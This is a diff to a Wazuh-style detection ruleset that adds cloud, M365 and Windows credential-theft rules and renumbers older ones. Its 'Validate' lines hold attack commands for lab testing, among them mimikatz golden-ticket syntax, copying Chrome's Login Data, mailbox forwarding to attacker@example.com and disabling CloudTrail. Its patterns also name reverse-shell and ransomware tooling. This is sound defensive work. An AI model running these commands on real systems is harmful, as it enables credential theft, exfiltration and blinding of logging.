@@ -9,12 +9,47 @@
   Tune thresholds to your environment before relying on these.
 -->
 
+<!-- AWS S3 Public Access Block Removed  [rules/collection/aws-s3-public-access-block-removed.yml]
+     status: experimental
+-->
+<group name="amazon,aws,">
+  <rule id="100100" level="12">
+    <if_group>amazon</if_group>
+    <field name="aws.eventName" type="pcre2">(?i)^DeleteBucketPublicAccessBlock$|^DeletePublicAccessBlock$</field>
+    <description>AWS S3 Public Access Block Removed</description>
+    <info type="text">Rule by Tyrian</info>
+    <info type="text">Validate (Atomic Red Team T1530): aws s3api delete-public-access-block --bucket &lt;lab-bucket&gt;</info>
+    <mitre>
+      <id>T1530</id>
+    </mitre>
+    <options>no_full_log</options>
+  </rule>
+</group>
+
+<!-- M365 Mailbox Forwarding or Redirect Rule Created  [rules/collection/m365-inbox-forwarding-rule.yml]
+     status: experimental
+-->
+<group name="office365,">
+  <rule id="100101" level="12">
+    <if_group>office365</if_group>
+    <field name="office365.Operation" type="pcre2">(?i)^New\-InboxRule$|^Set\-InboxRule$|^Set\-Mailbox$|^UpdateInboxRules$</field>
+    <field name="office365.Parameters" type="pcre2">(?i)ForwardTo|RedirectTo|ForwardAsAttachmentTo|ForwardingSmtpAddress</field>
+    <description>M365 Mailbox Forwarding or Redirect Rule Created</description>
+    <info type="text">Rule by Tyrian</info>
+    <info type="text">Validate (Atomic Red Team T1114.003): New-InboxRule -Name fwd -Mailbox &lt;lab-user&gt; -ForwardTo attacker@example.com</info>
+    <mitre>
+      <id>T1114.003</id>
+    </mitre>
+    <options>no_full_log</options>
+  </rule>
+</group>
+
 <!-- File Transfer via BITS  [rules/command-and-control/bitsadmin-transfer-job.yml]
      status: experimental
      NOTE: the source condition is a disjunction, so it compiles to 2 sibling rules below (any one of them firing means a hit).
 -->
 <group name="sysmon,">
-  <rule id="100100" level="8">
+  <rule id="100102" level="8">
     <if_group>sysmon_event1</if_group>
     <field name="win.eventdata.image" type="pcre2">(?i)\\bitsadmin\.exe$</field>
     <field name="win.eventdata.commandLine" type="pcre2">(?i)/transfer|/addfile|/setnotifycmdline</field>
@@ -30,7 +65,7 @@
 </group>
 
 <group name="sysmon,">
-  <rule id="100101" level="8">
+  <rule id="100103" level="8">
     <if_group>sysmon_event1</if_group>
     <field name="win.eventdata.commandLine" type="pcre2">(?i)(?=.*Start\-BitsTransfer)(?=.*\-Source)</field>
     <description>File Transfer via BITS (2/2: powershell_bits)</description>
@@ -48,7 +83,7 @@
      status: experimental
 -->
 <group name="sysmon,">
-  <rule id="100102" level="12">
+  <rule id="100104" level="12">
     <if_group>sysmon_event1</if_group>
     <field name="win.system.eventID" type="pcre2">(?i)^17$|^18$</field>
     <field name="win.eventdata.pipeName" type="pcre2">(?i)^\\msagent_|^\\postex_|^\\postex_ssh_|^\\status_|^\\MSSE\-|^\\mojo_|^\\netsvc_</field>
@@ -67,7 +102,7 @@
      status: experimental
 -->
 <group name="sysmon,">
-  <rule id="100103" level="8">
+  <rule id="100105" level="8">
     <if_group>sysmon_event1</if_group>
     <field name="win.system.eventID" type="pcre2">(?i)^22$</field>
     <field name="win.eventdata.queryName" type="pcre2">^[A-Za-z0-9+/=_-]{40,}\.</field>
@@ -88,7 +123,7 @@
      status: experimental
 -->
 <group name="windows,windows_security,">
-  <rule id="100104" level="14">
+  <rule id="100106" level="14">
     <if_group>windows_security</if_group>
     <field name="win.system.eventID" type="pcre2">(?i)^4886$|^4887$</field>
     <field name="win.eventdata.attributes" type="pcre2">(?i)SAN:|subjectaltname|upn=</field>
@@ -106,7 +141,7 @@
      status: experimental
 -->
 <group name="windows,windows_security,">
-  <rule id="100105" level="12">
+  <rule id="100107" level="12">
     <if_group>windows_security</if_group>
     <field name="win.system.eventID" type="pcre2">(?i)^4886$|^4887$</field>
     <field name="win.eventdata.requester" type="pcre2">(?i)\$$</field>
@@ -126,7 +161,7 @@
      status: stable
 -->
 <group name="windows,windows_security,">
-  <rule id="100106" level="12">
+  <rule id="100108" level="12">
     <if_group>windows_security</if_group>
     <field name="win.system.eventID" type="pcre2">(?i)^4768$</field>
     <field name="win.eventdata.ticketOptions" type="pcre2">(?i)^0x40810010$</field>
@@ -142,11 +177,29 @@
   </rule>
 </group>
 
+<!-- Browser Credential Store Accessed From the Command Line  [rules/credential-access/browser-credential-store-access.yml]
+     status: experimental
+-->
+<group name="sysmon,">
+  <rule id="100109" level="12">
+    <if_group>sysmon_event1</if_group>
+    <field name="win.eventdata.commandLine" type="pcre2">(?i)\\User\ Data\\Default\\Login\ Data|\\User\ Data\\Default\\Network\\Cookies|\\User\ Data\\Local\ State|\\key4\.db|\\logins\.json</field>
+    <description>Browser Credential Store Accessed From the Command Line</description>
+    <info type="text">Rule by Tyrian</info>
+    <info type="text">Validate (Atomic Red Team T1555.003): copy "%LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data" %TEMP%\ld.db</info>
+    <mitre>
+      <id>T1555.003</id>
+    </mitre>
+    <!-- tune: source rule also excludes [filter_browsers]; add <field negate="yes"> as needed -->
+    <options>no_full_log</options>
+  </rule>
+</group>
+
 <!-- DCSync Directory Replication From a Non-Domain-Controller  [rules/credential-access/dcsync-replication-rights.yml]
      status: stable
 -->
 <group name="windows,windows_security,">
-  <rule id="100107" level="14">
+  <rule id="100110" level="14">
     <if_group>windows_security</if_group>
     <field name="win.system.eventID" type="pcre2">(?i)^4662$</field>
     <field name="win.eventdata.properties" type="pcre2">(?i)1131f6aa\-9c07\-11d1\-f79f\-00c04fc2dcd2|1131f6ad\-9c07\-11d1\-f79f\-00c04fc2dcd2|89e95b76\-444d\-4c62\-991a\-0facbeda640c</field>
@@ -161,11 +214,70 @@
   </rule>
 </group>
 
+<!-- Entra ID MFA Push Fatigue  [rules/credential-access/entra-mfa-fatigue.yml]
+     status: experimental
+-->
+<group name="azure,">
+  <rule id="100111" level="12">
+    <if_group>azure</if_group>
+    <field name="ResultType" type="pcre2">(?i)^500121$</field>
+    <frequency>5</frequency>
+    <timeframe>600</timeframe>
+    <same_field>UserPrincipalName</same_field>
+    <description>Entra ID MFA Push Fatigue</description>
+    <info type="text">Rule by Tyrian</info>
+    <info type="text">Validate (Atomic Red Team T1621): Sign in to a lab account with its password and deny the MFA prompt five times.</info>
+    <mitre>
+      <id>T1621</id>
+    </mitre>
+    <options>no_full_log</options>
+  </rule>
+</group>
+
+<!-- Entra ID Password Spray From One IP  [rules/credential-access/entra-password-spray.yml]
+     status: experimental
+-->
+<group name="azure,">
+  <rule id="100112" level="12">
+    <if_group>azure</if_group>
+    <field name="ResultType" type="pcre2">(?i)^50126$</field>
+    <frequency>10</frequency>
+    <timeframe>600</timeframe>
+    <same_field>IPAddress</same_field>
+    <different_field>UserPrincipalName</different_field>
+    <description>Entra ID Password Spray From One IP</description>
+    <info type="text">Rule by Tyrian</info>
+    <info type="text">Validate (Atomic Red Team T1110.003): Spray one wrong password across 10+ lab tenant accounts from one IP, | e.g. with MSOLSpray or Invoke-AzureAdPasswordSprayAttack.</info>
+    <mitre>
+      <id>T1110.003</id>
+    </mitre>
+    <options>no_full_log</options>
+  </rule>
+</group>
+
+<!-- Golden or Silver Ticket Forging Tool Invoked  [rules/credential-access/forged-kerberos-ticket-tooling.yml]
+     status: experimental
+-->
+<group name="sysmon,">
+  <rule id="100113" level="14">
+    <if_group>sysmon_event1</if_group>
+    <field name="win.eventdata.commandLine" type="pcre2">(?i)kerberos::golden|\ golden\ /aes256:|\ golden\ /rc4:|\ silver\ /service:|ticketer\.py|\ /krbtgt:</field>
+    <description>Golden or Silver Ticket Forging Tool Invoked</description>
+    <info type="text">Rule by Tyrian</info>
+    <info type="text">Validate (Atomic Red Team T1558.001): mimikatz.exe "kerberos::golden /user:test /domain:contoso.local /sid:S-1-5-21-1-2-3 /krbtgt:00000000000000000000000000000000 /ptt" exit</info>
+    <mitre>
+      <id>T1558.001</id>
+      <id>T1558.002</id>
+    </mitre>
+    <options>no_full_log</options>
+  </rule>
+</group>
+
 <!-- Kerberoasting via RC4 Service Ticket Request  [rules/credential-access/kerberoasting-rc4-tgs.yml]
      status: stable
 -->
 <group name="windows,windows_security,">
-  <rule id="100108" level="12">
+  <rule id="100114" level="12">
     <if_group>windows_security</if_group>
     <field name="win.system.eventID" type="pcre2">(?i)^4769$</field>
     <field name="win.eventdata.ticketEncryptionType" type="pcre2">(?i)^0x17$</field>
@@ -185,7 +297,7 @@
      status: experimental
 -->
 <group name="windows,windows_security,">
-  <rule id="100109" level="14">
+  <rule id="100115" level="14">
     <if_group>windows_security</if_group>
     <field name="win.system.eventID" type="pcre2">(?i)^4723$|^4724$|^4738$</field>
     <field name="win.eventdata.targetUserName" type="pcre2">(?i)^krbtgt</field>
@@ -203,7 +315,7 @@
      status: experimental
 -->
 <group name="linux,audit,">
-  <rule id="100110" level="12">
+  <rule id="100116" level="12">
     <if_group>audit</if_group>
     <field name="audit.key" type="pcre2">(?i)^tyrian_shadow$</field>
     <description>Linux Password Hash File Accessed by a User</description>
@@ -220,7 +332,7 @@
      status: stable
 -->
 <group name="sysmon,">
-  <rule id="100111" level="14">
+  <rule id="100117" level="14">
     <if_group>sysmon_event1</if_group>
     <field name="win.eventdata.image" type="pcre2">(?i)\\rundll32\.exe$</field>
     <field name="win.eventdata.commandLine" type="pcre2">(?i)comsvcs</field>
@@ -239,7 +351,7 @@
      status: stable
 -->
 <group name="windows,">
-  <rule id="100112" level="12">
+  <rule id="100118" level="12">
     <if_group>windows</if_group>
     <field name="win.eventdata.targetImage" type="pcre2">(?i)\\lsass\.exe$</field>
     <field name="win.eventdata.grantedAccess" type="pcre2">(?i)^0x1010$|^0x1410$|^0x143a$|^0x1438$</field>
@@ -259,7 +371,7 @@
      NOTE: the source condition is a disjunction, so it compiles to 2 sibling rules below (any one of them firing means a hit).
 -->
 <group name="sysmon,">
-  <rule id="100113" level="14">
+  <rule id="100119" level="14">
     <if_group>sysmon_event1</if_group>
     <field name="win.eventdata.image" type="pcre2">(?i)\\ntdsutil\.exe$</field>
     <field name="win.eventdata.commandLine" type="pcre2">(?i)(?=.*create)(?=.*ifm)</field>
@@ -274,7 +386,7 @@
 </group>
 
 <group name="sysmon,">
-  <rule id="100114" level="14">
+  <rule id="100120" level="14">
     <if_group>sysmon_event1</if_group>
     <field name="win.eventdata.commandLine" type="pcre2">(?i)ntds\.dit</field>
     <description>NTDS.dit Extraction via ntdsutil or Shadow Copy (2/2: ditcopy)</description>
@@ -291,13 +403,14 @@
      status: stable
 -->
 <group name="windows,windows_security,">
-  <rule id="100115" level="12">
+  <rule id="100121" level="12">
     <if_group>windows_security</if_group>
     <field name="win.system.eventID" type="pcre2">(?i)^4625$</field>
     <field name="win.eventdata.subStatus" type="pcre2">(?i)^0xc000006a$</field>
     <frequency>10</frequency>
     <timeframe>300</timeframe>
     <same_field>win.eventdata.ipAddress</same_field>
+    <different_field>win.eventdata.targetUserName</different_field>
     <description>Password Spraying, Many Accounts from One Source</description>
     <info type="text">Rule by Tyrian</info>
     <info type="text">Validate (Atomic Red Team T1110.003): Spray one password across 20+ accounts from a single host, e.g. | kerbrute passwordspray -d &lt;domain&gt; users.txt 'Autumn2026!'</info>
@@ -312,7 +425,7 @@
      status: stable
 -->
 <group name="sysmon,">
-  <rule id="100116" level="14">
+  <rule id="100122" level="14">
     <if_group>sysmon_event1</if_group>
     <field name="win.eventdata.image" type="pcre2">(?i)\\reg\.exe$</field>
     <field name="win.eventdata.commandLine" type="pcre2">(?i)save</field>
@@ -331,7 +444,7 @@
      status: experimental
 -->
 <group name="windows,windows_security,">
-  <rule id="100117" level="14">
+  <rule id="100123" level="14">
     <if_group>windows_security</if_group>
     <field name="win.system.eventID" type="pcre2">(?i)^5136$</field>
     <field name="win.eventdata.attributeLDAPDisplayName" type="pcre2">(?i)^msDS\-KeyCredentialLink$</field>
@@ -350,7 +463,7 @@
      status: stable
 -->
 <group name="sysmon,">
-  <rule id="100118" level="14">
+  <rule id="100124" level="14">
     <if_group>sysmon_event1</if_group>
     <field name="win.eventdata.targetObject" type="pcre2">(?i)\\WDigest\\UseLogonCredential$</field>
     <field name="win.eventdata.details" type="pcre2">(?i)^DWORD\ \(0x00000001\)$</field>
@@ -364,12 +477,30 @@
   </rule>
 </group>
 
+<!-- AWS Security Logging or Monitoring Disabled  [rules/defense-evasion/aws-security-logging-disabled.yml]
+     status: experimental
+-->
+<group name="amazon,aws,">
+  <rule id="100125" level="12">
+    <if_group>amazon</if_group>
+    <field name="aws.eventName" type="pcre2">(?i)^StopLogging$|^DeleteTrail$|^UpdateTrail$|^PutEventSelectors$|^DeleteDetector$|^DeleteFlowLogs$|^StopConfigurationRecorder$|^DeleteConfigurationRecorder$|^DeleteDeliveryChannel$</field>
+    <description>AWS Security Logging or Monitoring Disabled</description>
+    <info type="text">Rule by Tyrian</info>
+    <info type="text">Validate (Atomic Red Team T1562.008): aws cloudtrail stop-logging --name &lt;lab-trail&gt;</info>
+    <mitre>
+      <id>T1562.008</id>
+      <id>T1562.001</id>
+    </mitre>
+    <options>no_full_log</options>
+  </rule>
+</group>
+
 <!-- DCShadow Rogue Domain Controller Registration  [rules/defense-evasion/dcshadow-rogue-domain-controller.yml]
      status: experimental
      NOTE: the source condition is a disjunction, so it compiles to 2 sibling rules below (any one of them firing means a hit).
 -->
 <group name="windows,windows_security,">
-  <rule id="100119" level="14">
+  <rule id="100126" level="14">
     <if_group>windows_security</if_group>
     <field name="win.system.eventID" type="pcre2">(?i)^5137$</field>
     <field name="win.eventdata.objectClass" type="pcre2">(?i)^nTDSDSA$</field>
@@ -384,7 +515,7 @@
 </group>
 
 <group name="windows,windows_security,">
-  <rule id="100120" level="14">
+  <rule id="100127" level="14">
     <if_group>windows_security</if_group>
     <field name="win.system.eventID" type="pcre2">(?i)^5136$</field>
     <field name="win.eventdata.attributeLDAPDisplayName" type="pcre2">(?i)^servicePrincipalName$</field>
@@ -403,7 +534,7 @@
      status: stable
 -->
 <group name="sysmon,">
-  <rule id="100121" level="14">
+  <rule id="100128" level="14">
     <if_group>sysmon_event1</if_group>
     <field name="win.eventdata.commandLine" type="pcre2">(?i)Set\-MpPreference\ \-DisableRealtimeMonitoring\ \$true|DisableRealtimeMonitoring\ 1|Add\-MpPreference\ \-ExclusionPath|DisableAntiSpyware</field>
     <description>Microsoft Defender Protection Disabled</description>
@@ -420,7 +551,7 @@
      status: stable
 -->
 <group name="windows,windows_security,">
-  <rule id="100122" level="14">
+  <rule id="100129" level="14">
     <if_group>windows_security</if_group>
     <field name="win.system.eventID" type="pcre2">(?i)^1102$|^104$</field>
     <description>Security or System Event Log Cleared</description>
@@ -438,7 +569,7 @@
      NOTE: the source condition is a disjunction, so it compiles to 2 sibling rules below (any one of them firing means a hit).
 -->
 <group name="linux,audit,">
-  <rule id="100123" level="14">
+  <rule id="100130" level="14">
     <if_group>audit</if_group>
     <field name="audit.key" type="pcre2">(?i)^tyrian_auditcfg$</field>
     <description>Linux Audit Subsystem Tampered With (1/2: config_or_binary)</description>
@@ -452,7 +583,7 @@
 </group>
 
 <group name="linux,audit,">
-  <rule id="100124" level="14">
+  <rule id="100131" level="14">
     <if_group>audit</if_group>
     <field name="audit.key" type="pcre2">(?i)^tyrian_exec$</field>
     <field name="audit.exe" type="pcre2">(?i)/systemctl$|/service$</field>
@@ -471,7 +602,7 @@
      status: experimental
 -->
 <group name="linux,audit,">
-  <rule id="100125" level="12">
+  <rule id="100132" level="12">
     <if_group>audit</if_group>
     <field name="audit.key" type="pcre2">(?i)^tyrian_exec$</field>
     <field name="audit.exe" type="pcre2">(?i)^/tmp/|^/var/tmp/|^/dev/shm/</field>
@@ -489,7 +620,7 @@
      status: experimental
 -->
 <group name="linux,audit,">
-  <rule id="100126" level="12">
+  <rule id="100133" level="12">
     <if_group>audit</if_group>
     <field name="audit.key" type="pcre2">(?i)^tyrian_logdel$</field>
     <description>Linux Log Files Deleted From /var/log</description>
@@ -502,11 +633,44 @@
   </rule>
 </group>
 
+<!-- M365 Unified Audit Logging Disabled or Bypassed  [rules/defense-evasion/m365-audit-logging-disabled.yml]
+     status: experimental
+     NOTE: the source condition is a disjunction, so it compiles to 2 sibling rules below (any one of them firing means a hit).
+-->
+<group name="office365,">
+  <rule id="100134" level="12">
+    <if_group>office365</if_group>
+    <field name="office365.Operation" type="pcre2">(?i)^Set\-AdminAuditLogConfig$</field>
+    <field name="office365.Parameters" type="pcre2">(?i)UnifiedAuditLogIngestionEnabled</field>
+    <description>M365 Unified Audit Logging Disabled or Bypassed (1/2: audit_config)</description>
+    <info type="text">Rule by Tyrian</info>
+    <info type="text">Validate (Atomic Red Team T1562.008): Set-AdminAuditLogConfig -UnifiedAuditLogIngestionEnabled $false</info>
+    <mitre>
+      <id>T1562.008</id>
+    </mitre>
+    <options>no_full_log</options>
+  </rule>
+</group>
+
+<group name="office365,">
+  <rule id="100135" level="12">
+    <if_group>office365</if_group>
+    <field name="office365.Operation" type="pcre2">(?i)^Set\-MailboxAuditBypassAssociation$</field>
+    <description>M365 Unified Audit Logging Disabled or Bypassed (2/2: bypass)</description>
+    <info type="text">Rule by Tyrian</info>
+    <info type="text">Validate (Atomic Red Team T1562.008): Set-AdminAuditLogConfig -UnifiedAuditLogIngestionEnabled $false</info>
+    <mitre>
+      <id>T1562.008</id>
+    </mitre>
+    <options>no_full_log</options>
+  </rule>
+</group>
+
 <!-- AMSI Bypass Attempt in PowerShell  [rules/defense-evasion/powershell-amsi-bypass.yml]
      status: stable
 -->
 <group name="windows,powershell,">
-  <rule id="100127" level="14">
+  <rule id="100136" level="14">
     <if_group>windows</if_group>
     <field name="win.eventdata.scriptBlockText" type="pcre2">(?i)amsiInitFailed|AmsiUtils|AmsiScanBuffer|System\.Management\.Automation\.AmsiUtils</field>
     <description>AMSI Bypass Attempt in PowerShell</description>
@@ -523,7 +687,7 @@
      status: experimental
 -->
 <group name="sysmon,">
-  <rule id="100128" level="12">
+  <rule id="100137" level="12">
     <if_group>sysmon_event1</if_group>
     <field name="win.system.eventID" type="pcre2">(?i)^25$</field>
     <description>Process Image Tampering (Hollowing or Herpaderping)</description>
@@ -540,7 +704,7 @@
      status: experimental
 -->
 <group name="sysmon,">
-  <rule id="100129" level="12">
+  <rule id="100138" level="12">
     <if_group>sysmon_event1</if_group>
     <field name="win.system.eventID" type="pcre2">(?i)^8$</field>
     <field name="win.eventdata.targetImage" type="pcre2">(?i)\\lsass\.exe$|\\explorer\.exe$|\\svchost\.exe$|\\winlogon\.exe$|\\notepad\.exe$|\\rundll32\.exe$</field>
@@ -561,7 +725,7 @@
      NOTE: the source condition is a disjunction, so it compiles to 2 sibling rules below (any one of them firing means a hit).
 -->
 <group name="sysmon,">
-  <rule id="100130" level="12">
+  <rule id="100139" level="12">
     <if_group>sysmon_event1</if_group>
     <field name="win.eventdata.image" type="pcre2">(?i)\\rundll32\.exe$</field>
     <field name="win.eventdata.commandLine" type="pcre2">(?i)\\Users\\Public\\|\\AppData\\Local\\Temp\\|\\Windows\\Temp\\|\\ProgramData\\|C:\\Users\\</field>
@@ -576,7 +740,7 @@
 </group>
 
 <group name="sysmon,">
-  <rule id="100131" level="12">
+  <rule id="100140" level="12">
     <if_group>sysmon_event1</if_group>
     <field name="win.eventdata.image" type="pcre2">(?i)\\rundll32\.exe$</field>
     <field name="win.eventdata.commandLine" type="pcre2">(?i)javascript:|vbscript:|mshtml,RunHTMLApplication|url\.dll,OpenURL|shell32\.dll,ShellExec_RunDLL</field>
@@ -594,7 +758,7 @@
      status: stable
 -->
 <group name="sysmon,">
-  <rule id="100132" level="12">
+  <rule id="100141" level="12">
     <if_group>sysmon_event1</if_group>
     <field name="win.eventdata.commandLine" type="pcre2">(?i)sharphound|\-c\ all|\-\-collectionmethod|Invoke\-BloodHound|bloodhound\.py</field>
     <description>Active Directory Collection Consistent With SharpHound</description>
@@ -611,7 +775,7 @@
      status: experimental
 -->
 <group name="sysmon,">
-  <rule id="100133" level="8">
+  <rule id="100142" level="8">
     <if_group>sysmon_event1</if_group>
     <field name="win.eventdata.commandLine" type="pcre2">(?i)net\ group\ "domain\ admins"|net\ localgroup\ administrators|nltest\ /domain_trusts|nltest\ /dclist|whoami\ /groups|net\ user\ /domain</field>
     <frequency>3</frequency>
@@ -632,7 +796,7 @@
      status: experimental
 -->
 <group name="linux,audit,">
-  <rule id="100134" level="8">
+  <rule id="100143" level="8">
     <if_group>audit</if_group>
     <field name="audit.key" type="pcre2">(?i)^tyrian_exec$</field>
     <field name="audit.exe" type="pcre2">(?i)/whoami$|/id$|/uname$|/hostname$|/lastlog$|/last$|/w$|/netstat$|/ss$|/lsof$|/crontab$</field>
@@ -654,7 +818,7 @@
      status: stable
 -->
 <group name="sysmon,">
-  <rule id="100135" level="12">
+  <rule id="100144" level="12">
     <if_group>sysmon_event1</if_group>
     <field name="win.eventdata.image" type="pcre2">(?i)\\certutil\.exe$</field>
     <field name="win.eventdata.commandLine" type="pcre2">(?i)urlcache|verifyctl|decode|\-f\ http</field>
@@ -672,7 +836,7 @@
      status: experimental
 -->
 <group name="linux,audit,">
-  <rule id="100136" level="8">
+  <rule id="100145" level="8">
     <if_group>audit</if_group>
     <field name="audit.key" type="pcre2">(?i)^tyrian_exec$</field>
     <field name="audit.execve.a2" type="pcre2">(curl|wget)[^|]*\|\s*(sudo\s+)?(ba|z|k)?sh</field>
@@ -692,7 +856,7 @@
      NOTE: the source condition is a disjunction, so it compiles to 3 sibling rules below (any one of them firing means a hit).
 -->
 <group name="linux,audit,">
-  <rule id="100137" level="14">
+  <rule id="100146" level="14">
     <if_group>audit</if_group>
     <field name="audit.key" type="pcre2">(?i)^tyrian_exec$</field>
     <field name="audit.execve.a2" type="pcre2">(?i)/dev/tcp/</field>
@@ -707,7 +871,7 @@
 </group>
 
 <group name="linux,audit,">
-  <rule id="100138" level="14">
+  <rule id="100147" level="14">
     <if_group>audit</if_group>
     <field name="audit.key" type="pcre2">(?i)^tyrian_exec$</field>
     <field name="audit.exe" type="pcre2">(?i)/nc$|/ncat$|/netcat$|/nc\.openbsd$|/nc\.traditional$</field>
@@ -723,7 +887,7 @@
 </group>
 
 <group name="linux,audit,">
-  <rule id="100139" level="14">
+  <rule id="100148" level="14">
     <if_group>audit</if_group>
     <field name="audit.key" type="pcre2">(?i)^tyrian_exec$</field>
     <field name="audit.execve.a2" type="pcre2">(?i)(?=.*socket)(?=.*pty\.spawn)</field>
@@ -741,7 +905,7 @@
      status: stable
 -->
 <group name="sysmon,">
-  <rule id="100140" level="12">
+  <rule id="100149" level="12">
     <if_group>sysmon_event1</if_group>
     <field name="win.eventdata.image" type="pcre2">(?i)\\mshta\.exe$</field>
     <field name="win.eventdata.commandLine" type="pcre2">(?i)http://|https://|javascript:|vbscript:|\.hta</field>
@@ -759,7 +923,7 @@
      status: stable
 -->
 <group name="sysmon,">
-  <rule id="100141" level="12">
+  <rule id="100150" level="12">
     <if_group>sysmon_event1</if_group>
     <field name="win.eventdata.image" type="pcre2">(?i)\\powershell\.exe$|\\pwsh\.exe$</field>
     <field name="win.eventdata.commandLine" type="pcre2">(?i)DownloadString|DownloadFile|Invoke\-WebRequest|Net\.WebClient|iwr\ |curl\ </field>
@@ -778,7 +942,7 @@
      status: stable
 -->
 <group name="sysmon,">
-  <rule id="100142" level="12">
+  <rule id="100151" level="12">
     <if_group>sysmon_event1</if_group>
     <field name="win.eventdata.image" type="pcre2">(?i)\\powershell\.exe$|\\pwsh\.exe$</field>
     <field name="win.eventdata.commandLine" type="pcre2">(?i)\ \-enc|\ \-EncodedCommand|\ \-e\ |\ \-ec\ </field>
@@ -796,7 +960,7 @@
      status: stable
 -->
 <group name="sysmon,">
-  <rule id="100143" level="14">
+  <rule id="100152" level="14">
     <if_group>sysmon_event1</if_group>
     <field name="win.eventdata.image" type="pcre2">(?i)\\regsvr32\.exe$</field>
     <field name="win.eventdata.commandLine" type="pcre2">(?i)scrobj|/i:http|\.sct</field>
@@ -814,7 +978,7 @@
      status: experimental
 -->
 <group name="sysmon,">
-  <rule id="100144" level="8">
+  <rule id="100153" level="8">
     <if_group>sysmon_event1</if_group>
     <field name="win.eventdata.image" type="pcre2">(?i)\\7z\.exe$|\\rar\.exe$|\\winrar\.exe$</field>
     <field name="win.eventdata.commandLine" type="pcre2">(?i)\ a\ |\ \-hp</field>
@@ -834,7 +998,7 @@
      NOTE: the source condition is a disjunction, so it compiles to 2 sibling rules below (any one of them firing means a hit).
 -->
 <group name="sysmon,">
-  <rule id="100145" level="12">
+  <rule id="100154" level="12">
     <if_group>sysmon_event1</if_group>
     <field name="win.eventdata.image" type="pcre2">(?i)\\rclone\.exe$|\\megacmd\.exe$|\\MEGAclient\.exe$|\\winscp\.com$|\\winscp\.exe$</field>
     <field name="win.eventdata.commandLine" type="pcre2">(?i)copy|sync|move|put</field>
@@ -849,7 +1013,7 @@
 </group>
 
 <group name="sysmon,">
-  <rule id="100146" level="12">
+  <rule id="100155" level="12">
     <if_group>sysmon_event1</if_group>
     <field name="win.eventdata.originalFileName" type="pcre2">(?i)^rclone\.exe$</field>
     <description>Bulk Upload to Cloud Storage via Command-Line Tooling (2/2: renamed_rclone)</description>
@@ -867,7 +1031,7 @@
      NOTE: the source condition is a disjunction, so it compiles to 2 sibling rules below (any one of them firing means a hit).
 -->
 <group name="sysmon,">
-  <rule id="100147" level="14">
+  <rule id="100156" level="14">
     <if_group>sysmon_event1</if_group>
     <field name="win.eventdata.commandLine" type="pcre2">(?i)wbadmin\ delete</field>
     <description>Backup and Recovery Destruction Before Encryption (1/2: wbadmin)</description>
@@ -881,7 +1045,7 @@
 </group>
 
 <group name="sysmon,">
-  <rule id="100148" level="14">
+  <rule id="100157" level="14">
     <if_group>sysmon_event1</if_group>
     <field name="win.eventdata.commandLine" type="pcre2">(?i)recoveryenabled\ no|bootstatuspolicy\ ignoreallfailures</field>
     <description>Backup and Recovery Destruction Before Encryption (2/2: bcdedit)</description>
@@ -899,7 +1063,7 @@
      NOTE: the source condition is a disjunction, so it compiles to 3 sibling rules below (any one of them firing means a hit).
 -->
 <group name="windows,">
-  <rule id="100149" level="12">
+  <rule id="100158" level="12">
     <if_group>windows</if_group>
     <field name="win.eventdata.image" type="pcre2">(?i)\\vssadmin\.exe$</field>
     <field name="win.eventdata.commandLine" type="pcre2">(?i)(?=.*delete)(?=.*shadows)</field>
@@ -915,7 +1079,7 @@
 </group>
 
 <group name="windows,">
-  <rule id="100150" level="12">
+  <rule id="100159" level="12">
     <if_group>windows</if_group>
     <field name="win.eventdata.image" type="pcre2">(?i)\\wmic\.exe$</field>
     <field name="win.eventdata.commandLine" type="pcre2">(?i)shadowcopy\ delete</field>
@@ -931,7 +1095,7 @@
 </group>
 
 <group name="windows,">
-  <rule id="100151" level="12">
+  <rule id="100160" level="12">
     <if_group>windows</if_group>
     <field name="win.eventdata.commandLine" type="pcre2">(?i)(?=.*Get\-WmiObject)(?=.*Win32_ShadowCopy)(?=.*Delete)</field>
     <description>Shadow Copy Deletion via VSSAdmin or WMIC (3/3: powershell)</description>
@@ -949,7 +1113,7 @@
      status: stable
 -->
 <group name="sysmon,">
-  <rule id="100152" level="14">
+  <rule id="100161" level="14">
     <if_group>sysmon_event1</if_group>
     <field name="win.eventdata.commandLine" type="pcre2">(?i)net\ stop\ |sc\ stop\ |Stop\-Service</field>
     <field name="win.eventdata.commandLine" type="pcre2">(?i)sql|veeam|backup|exchange|vss|msexchange</field>
@@ -966,11 +1130,29 @@
   </rule>
 </group>
 
+<!-- AWS Root Account Console Login  [rules/initial-access/aws-root-console-login.yml]
+     status: experimental
+-->
+<group name="amazon,aws,">
+  <rule id="100162" level="12">
+    <if_group>amazon</if_group>
+    <field name="aws.eventName" type="pcre2">(?i)^ConsoleLogin$</field>
+    <field name="aws.userIdentity.type" type="pcre2">(?i)^Root$</field>
+    <description>AWS Root Account Console Login</description>
+    <info type="text">Rule by Tyrian</info>
+    <info type="text">Validate (Atomic Red Team T1078.004): Sign in to a lab account's console with the root user email and password.</info>
+    <mitre>
+      <id>T1078.004</id>
+    </mitre>
+    <options>no_full_log</options>
+  </rule>
+</group>
+
 <!-- Office Application Spawns a Script Interpreter  [rules/initial-access/office-spawns-script-host.yml]
      status: stable
 -->
 <group name="windows,">
-  <rule id="100153" level="12">
+  <rule id="100163" level="12">
     <if_group>windows</if_group>
     <field name="win.eventdata.parentImage" type="pcre2">(?i)\\winword\.exe$|\\excel\.exe$|\\powerpnt\.exe$|\\outlook\.exe$</field>
     <field name="win.eventdata.image" type="pcre2">(?i)\\powershell\.exe$|\\cmd\.exe$|\\wscript\.exe$|\\cscript\.exe$|\\mshta\.exe$|\\rundll32\.exe$</field>
@@ -985,11 +1167,49 @@
   </rule>
 </group>
 
+<!-- Script Host Runs a Script From an Archive or Downloads Folder  [rules/initial-access/script-from-archive-or-downloads.yml]
+     status: experimental
+-->
+<group name="sysmon,">
+  <rule id="100164" level="12">
+    <if_group>sysmon_event1</if_group>
+    <field name="win.eventdata.image" type="pcre2">(?i)\\wscript\.exe$|\\cscript\.exe$|\\mshta\.exe$</field>
+    <field name="win.eventdata.commandLine" type="pcre2">(?i)\\AppData\\Local\\Temp\\Temp1_|\\AppData\\Local\\Temp\\7z|\\AppData\\Local\\Temp\\Rar\$|\\Downloads\\</field>
+    <description>Script Host Runs a Script From an Archive or Downloads Folder</description>
+    <info type="text">Rule by Tyrian</info>
+    <info type="text">Validate (Atomic Red Team T1204.002): echo WScript.Echo("t") &gt; %USERPROFILE%\Downloads\invoice.js &amp;&amp; wscript.exe %USERPROFILE%\Downloads\invoice.js</info>
+    <mitre>
+      <id>T1566.001</id>
+      <id>T1204.002</id>
+    </mitre>
+    <options>no_full_log</options>
